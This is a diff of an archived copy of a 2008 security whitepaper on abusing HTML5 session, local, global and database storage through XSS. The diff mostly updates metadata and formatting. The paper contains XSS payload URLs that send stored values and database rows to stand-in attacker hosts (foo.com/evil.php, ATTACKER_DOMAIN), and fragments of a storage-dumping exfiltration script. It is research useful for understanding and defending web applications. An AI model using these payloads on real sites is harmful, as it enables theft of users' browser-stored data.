@@ -3,17 +3,18 @@ type: Whitepaper
 title: Abusing HTML 5 Structured Client-side Storage
 description: "Session, global, local and Database Storage have no HTTPOnly, no path scoping and no port scoping, so one XSS anywhere on a host reads all of it. Enumerate keys with for(i in sessionStorage), find databases by testing window[i]==\"[object Database]\", pull schema from sqlite_master, then exfiltrate with the HTML5CSdump script given in full. Covers cross-directory, cross-domain and client-side SQLi."
 resource: "http://trivero.secdiscover.com/html5whitepaper.pdf"
-tags: [whitepaper, webseclist-reference, xss, sqli, info-leak, javascript, dom, same-origin-policy, database, owasp-a01-2021, owasp-a03-2021]
+tags: [whitepaper, webseclist-reference, secdiscover, xss, sqli, info-leak, javascript, dom, same-origin-policy, database, owasp-a01-2021, owasp-a03-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-07T09:50:52+00:00"
+  at: "2026-09-09T22:14:26+00:00"
 status: deprecated
-stale_after: 2027-08-07
+stale_after: 2027-09-09
 sources:
   - id: original
     resource: "http://trivero.secdiscover.com/html5whitepaper.pdf"
     title: Abusing HTML 5 Structured Client-side Storage
     author: Alberto Trivero
+    last_modified: 2008-07-20
 also_at: []
 authors:
   - Alberto Trivero
@@ -21,20 +22,20 @@ canonical_url: ""
 cited_by:
   - "2008.md:10"
 commit: ""
-content_sha256: b79cc45c8f61583752213047f0eed41e36e8663ae695403384331c9b3f98fee3
+content_sha256: e4eb5b991a68d5131af6fe4c3863d4475f7d77662920bb8579df4dcd5cd1e958
 depth: full
 depth_reason: default
 kind: whitepaper
 language: ""
 licence: unknown
 original_url: "http://trivero.secdiscover.com/html5whitepaper.pdf"
-published: ""
-publisher: ""
+published: 2008-07-20
+publisher: SecDiscover
 publisher_english: ""
 raw_sha256: 0ddaf42ba4ec4ac75fdb109bc87f80612867ca46ad4ebe6f2e7eaf2b2921e486
 retrieved_from: "http://trivero.secdiscover.com/html5whitepaper.pdf"
 retrieved_kind: manual-import
-retrieved_utc: "2026-08-07T09:50:52+00:00"
+retrieved_utc: "2026-09-09T22:14:26+00:00"
 slug: abusing-html-5-structured-client-side-storage
 snapshot: ""
 title_english: ""
@@ -44,11 +45,11 @@ translation_of: ""
 
 # Abusing HTML 5 Structured Client-side Storage
 
-**Abusing HTML 5 Structured Client-side Storage** - Alberto Trivero, Publisher not stated.
+**Abusing HTML 5 Structured Client-side Storage** - Alberto Trivero, SecDiscover.
 
-- Published: date not stated
+- Published: 2008-07-20
 - Original: <http://trivero.secdiscover.com/html5whitepaper.pdf>
-- Preserved from: http://trivero.secdiscover.com/html5whitepaper.pdf (manual-import) on 2026-08-07
+- Preserved from: http://trivero.secdiscover.com/html5whitepaper.pdf (manual-import) on 2026-09-09
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -72,8 +73,6 @@ First release: 20 July 2008
 Latest revision: 17 October 2008
 
                                    Sponsored by
-Alberto Trivero     Abusing HTML 5 Structured Client-side Storage   a.trivero(*)secdiscover.com   www.secdiscover.com
-
 Table of Contents
 
     Introduction                                                                                                   2
@@ -96,9 +95,6 @@ Table of Contents
     Conclusions                                                                                                    8
     References                                                                                                     8
     Appendix A                                                                                                   10
-
-                                                              1
-Alberto Trivero       Abusing HTML 5 Structured Client-side Storage         a.trivero(*)secdiscover.com      www.secdiscover.com
 
 Introduction
 Client-side storage is at the heart of modern web technologies and it’s very important for many web developers. Currently
@@ -155,16 +151,15 @@ situation for client-side storage analyzing the most commons rendering engine.
 Could be interesting to know quickly which of the tree typologies of client-side storage your browser support, without the
 need to try to search the answer in the online documentation. To accomplish this task you can use this simple JS script:
 
+```text
 var storSupp = "";
 if("sessionStorage" in window) { storSupp += "Session Storage "; }
 if("globalStorage" in window) { storSupp += "Global Storage "; }
 if("localStorage" in window) { storSupp += "Local Storage "; }
 
-                                                                  2
-Alberto Trivero       Abusing HTML 5 Structured Client-side Storage         a.trivero(*)secdiscover.com       www.secdiscover.com
-
 if("openDatabase" in window) { storSupp += "Database Storage "; }
 document.write(storSupp);
+```
 
 Session Storage
 Session storage is quite similar to HTTP cookies but has some relevant benefits: there’s much more storage capacity (some
@@ -201,27 +196,30 @@ browser is closed, unlike session storage.
 
 Some simple examples are:
 
+```text
 localStorage.foobar = 1337;
 globalStorage['example.com'].foo = "bar";
 globalStorage[location.hostname].pg = “The quick brown fox jumps over the lazy dog”;
+```
 
 Firefox 3.0 saves these persistent data, under Mac OS X, in this SQLite file:
 
+```text
 /Users/[username]/Library/Application Support/Firefox/Profiles/[random string]/
 webappsstore.sqlite
+```
 
 and under Windows XP in this one:
 
+```text
 C:\Documents and Settings\[username]\Application Data\Mozilla\Firefox\Profiles\[random
 string]\webappsstore.sqlite
+```
 
 Database Storage
 Similarly to Google Gears, HTML 5’s database storage allows a web application to save structured data in the client’s
 machine using a real SQL database. This feature will allow the development of very powerful applications. A simple example
 [14] was released by the developers of WebKit, the only that now supports database storage.
-
-                                                                 3
-Alberto Trivero          Abusing HTML 5 Structured Client-side Storage       a.trivero(*)secdiscover.com       www.secdiscover.com
 
 Like the other two storage methodologies, you can save only strings and data will be accessible solely by the exactly same
 origin has created it.
@@ -229,14 +227,18 @@ origin has created it.
 The syntax could create some problems at a first approach. For a complete reference see the HTML 5 draft [15]. Now I’ll
 show you only some quick and simple examples:
 
+```text
 db = openDatabase("dbTest", "1.0", "First Database", 300000);
 db.transaction(function(tx) { tx.executeSql("CREATE TABLE MyTb (id REAL)"); });
 db.transaction(function(tx) { tx.executeSql("SELECT * FROM MyTb”, [], function(tx,
 result) { alert(result.rows.item(0)['id']); }); });
+```
 
 WebKit (therefore Safari and so on) uses SQLite as database backend. Under Mac OS X you can find its storage files in:
 
+```text
 /Users/[username]/Library/Safari/Databases
+```
 
 Could be useful to use the Safari’s Web Inspector to navigate through the content of a site’s local database and forgering
 SQL queries.
@@ -266,6 +268,7 @@ implications. I’ll discuss them here with some more details using development 
 
 Consider this simple piece of code:
 
+```text
 sessionStorage.foo = false;
 if(sessionStorage.foo) {
         alert("true");
@@ -273,6 +276,7 @@ if(sessionStorage.foo) {
 else {
         alert("false");
 }
+```
 
 It’s quite obvious to say it’ll show false. Well, it show true instead, on every browser. Why? As stated at the beginning, the
 three storage methodologies store strings, this is the point. typeof(sessionStorage.foo) return object on Firefox 2.0
@@ -281,9 +285,6 @@ behavior), but never return boolean. So, depending to the browser, our keys are 
 objects. So how to obtain false, as expected? With WebKit we can use sessionStorage.foo = ‘’;, but with Firefox
 and Internet Explorer it’s been impossible, for me, to obtain false, even using toString(), quite odd. This strange facts makes
 very easy to write buggy JavaScript code that could create unintended and potentially insecure behaviors.
-
-                                                                   4
-Alberto Trivero       Abusing HTML 5 Structured Client-side Storage          a.trivero(*)secdiscover.com       www.secdiscover.com
 
 Abusing HTML 5 Structured Client-side Storage
 Although researchers like Ronald van den Heetkamp [17] have already underlined the risks of client-side storage in HTML 5
@@ -328,32 +329,35 @@ If you want to acquire the value of a storage object using a XSS payload, you us
 which could be a limitation. To overcome this problem we’ll see two scripts that allow you to acquire all the keys for session
 storage, global storage and local storage:
 
+```text
 var ss = "";
 for(i in window.sessionStorage) {
         ss += i + " ";
 }
+```
 
 This example is for session storage, but could by easily used for the other storage methodologies. We can obtain the same
 result, in this case for local storage, with the API supplied by the HTML 5 draft:
 
+```text
 var ls = "";
 for(i = 0; i < localStorage.length; i++) {
         ls += localStorage.key(i) + " ";
 }
-
-                                                                  5
-Alberto Trivero        Abusing HTML 5 Structured Client-side Storage       a.trivero(*)secdiscover.com      www.secdiscover.com
+```
 
 Database Object Enumeration
 The HTML 5 draft says that “there is no way to enumerate or delete the databases available for a domain from this API”. So
 if we want to know the content of a database object without knowing its name, we have to use some escamotages:
 
+```text
 var db = "";
 for(i in window) {
         if(window[i] == “[object Database]”) {
                   db += i + “ “;
         }
 }
+```
 
 Extracting Database Metadata
 If you know everything of the structure of a client-side database you can do everything you want with it, but if you don’t, you
@@ -361,33 +365,43 @@ have to extract its structure in some way. We have said before that WebKit uses 
 database has a table called sqlite_master containing the names of all the tables of the database. To gain them you can
 use a SQL query like this one:
 
+```text
 SELECT name FROM sqlite_master WHERE type='table'
+```
 
 Once you have a table name you probably want to knows its columns. The sqlite_master table has a column called sql
 which contains the SQL CREATE statement for a certain table where you can see its columns:
 
+```text
 SELECT sql FROM sqlite_master WHERE name='table_name'
+```
 
 If you’re asking yourself which version of SQLite uses WebKit, the answer is 3.4.0, released about a year ago (the latest
 available is 3.6.1):
 
+```text
 SELECT sqlite_version()
+```
 
 One Shot Attack
 What makes uncomfortable client-side attacks is the difficulty to constantly interact with the target. Let’s see now a classic
 XSS attack scenario where I acquire client-side data thanks to my knowledge of its structure (keys names, database objects
 name, database tables names, etc.):
 
+```text
 http://example.com/page.php?name=<script>document.write('<img src="http://foo.com/
 evil.php?name=' %2B globalStorage[location.hostname].mykey %2B '">');</script>
+```
 
 Example.com has a XSS vulnerability in the name variable and uses global storage to save an object on the client’s machine
 which have a key named mykey. If a site’s user click on that URL, the value of mykey is sent to the attacker’s domain
 foo.com and stored. Quite simple.
 
+```text
 http://example.com/page.php?name=<script>db.transaction(function (tx) { tx.executeSql
 ("SELECT * FROM client_tb", [], function(tx, result) { document.write('<img src="http://
 foo.com/evil.php?name=' %2B result.rows.item(0)['col_data'] %2B '">'); }); });</script>
+```
 
 In this case we are attacking database storage of example.com instead. If a site’s user click on that URL, the content of the
 column col_data in the first row of the table client_tb is sent to the attacker’s page and stored.
@@ -401,14 +415,53 @@ name without the need of any user interaction (except to click on a link) and wi
 structure of the web application. The script is available at the appendix A of this white paper and at this address: http://
 trivero.secdiscover.com/html5csdump.js
 
-                                                                 6
-Alberto Trivero       Abusing HTML 5 Structured Client-side Storage       a.trivero(*)secdiscover.com     www.secdiscover.com
-
 An example to inject the script in a XSS vulnerable page is this:
 
+```text
 http://example.com/page.php?name=<script src=http://foo.com/evil.js></script>
+```
 
 An example of the script’s output is this:
+
+[Archive transcription of the screenshot on PDF page 8 (printed page 7). Browser address: `http://localhost:8888/evil.txt`.]
+
+```text
+User Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_5; it-it) AppleWebKit/528.4 (KHTML,
+like Gecko) Version/3.1.2 Safari/525.20.1
+HTML 5 Structured Clien-side Storage Support: Session Storage, Local Storage, Database Storage
+
+        = SESSION STORAGE =
+
+window.sessionStorage.hello = say hallo to who spy on you
+window.sessionStorage.ciao = ciaooo
+window.sessionStorage.wisdom = cornuto disse il bue all\'asino
+
+        = GLOBAL STORAGE =
+
+        = LOCAL STORAGE =
+
+window.localStorage.bill = There are no significant bugs in our released software that any
+significant number of users want fixed. (Bill Gates in 1995)
+window.localStorage.tux = Security people are often the black-and-white kind of people that I
+can\'t stand. (Linus Torvalds)
+window.localStorage.locale = storage locale
+window.localStorage.LinusWisdom = I think the OpenBSD crowd is a bunch of masturbating monkeys.
+
+        = DATABASE STORAGE =
+
+Database object: window.db
+Table name: WebKitStickyNotes2
+Database schema:
+```
+
+| id | note | timestamp | left | top | zindex |
+| --- | --- | --- | --- | --- | --- |
+| 1 | 2 pwned | 1224287293327 | 206px | 50px | 45 |
+| 2 | 31337 | 1224287302991 | 465px | 138px | 50 |
+| 3 | ohohoh | 1224287295311 | 24px | 168px | 46 |
+| 4 | 3 Owned | 1224287291839 | 300px | 259px | 47 |
+| 5 | lalalala | 1224287320367 | 654px | 70px | 52 |
+
 
 As you can see the script gives to the attacker informations on the user agent of the victim, what client-side storage
 methodologies it supports, and all the content of the storage data for the attacked domain.
@@ -426,9 +479,6 @@ Cross-domain attacks are feasible against global storage in Firefox 2.0, and can
 restrictions. Imagine a user who uses admin.example.com which saves on his computer
 globalStorage[‘example.com’].privID = 31337, now if someone has the control of, for example,
 
-                                                                7
-Alberto Trivero        Abusing HTML 5 Structured Client-side Storage         a.trivero(*)secdiscover.com       www.secdiscover.com
-
 employers.example.com or exploit a XSS vulnerability, can easily access to that global storage object. Firefox 3.0 doesn’t
 allow anymore this kind of attacks.
 
@@ -441,11 +491,15 @@ SQL injection attacks were always be considered as server-side problem, but alre
 client-side problem. In HTML 5 the problem exists when the query parameters are not passed though the ? placeholder but
 directly. This is the wrong use:
 
+```text
 executeSql("SELECT name FROM stud WHERE id=" + input_id);
+```
 
 This is the correct use:
 
+```text
 executeSql("SELECT name FROM stud WHERE id=?", [input_id]);
+```
 
 The problem with client-side SQL injection attacks is that the exploitability is very variable and usually quite low. In fact
 supposing you are able to execute a classical UNION SELECT to extract from the local database the data you desire, then
@@ -484,9 +538,6 @@ side-storage
 [10] http://developer.mozilla.org/En/DOM:Storage
 [11] http://msdn.microsoft.com/en-us/library/cc197062(VS.85).aspx
 
-                                                                 8
-Alberto Trivero      Abusing HTML 5 Structured Client-side Storage       a.trivero(*)secdiscover.com   www.secdiscover.com
-
 [12] http://ejohn.org/blog/dom-storage-answers/
 [13] http://www.whatwg.org/specs/web-apps/current-work/multipage/browsers.html#origin-0
 [14] http://webkit.org/misc/DatabaseExample.html
@@ -496,10 +547,8 @@ Alberto Trivero      Abusing HTML 5 Structured Client-side Storage       a.trive
 [18] http://www.gnucitizen.org/blog/client-side-sql-injection-attacks/
 [19] http://www.niallkennedy.com/blog/2007/01/ajax-performance-local-storage.html
 
-                                                               9
-Alberto Trivero   Abusing HTML 5 Structured Client-side Storage   a.trivero(*)secdiscover.com   www.secdiscover.com
-
 Appendix A
+```javascript
 /*/
  * HTML5CSdump v0.6 - August 2008
  * This JavaScript code will dump in an automated fashion ALL the content of the
@@ -567,9 +616,6 @@ name=?", [row['name']], function(ty, result2) {
                                                       var theRegExp = /^[^(]*\(`/;
                                                       var columns = dbSchema.split(theRegExp);
 
-                                                           10
-Alberto Trivero   Abusing HTML 5 Structured Client-side Storage        a.trivero(*)secdiscover.com   www.secdiscover.com
-
                                                                   var theRegExp = /`[^`]*[`)]/;
                                                                   columns = columns[1].split(theRegExp);
                                                                   columns.splice(columns.length - 1); // remove
@@ -614,3 +660,4 @@ var dump_res = "User%20Agent%3A%20" + ua +
 document.write('<img src="http://ATTACKER_DOMAIN/evil.php?name=' + dump_res + '">');
 
                                                            11
+```
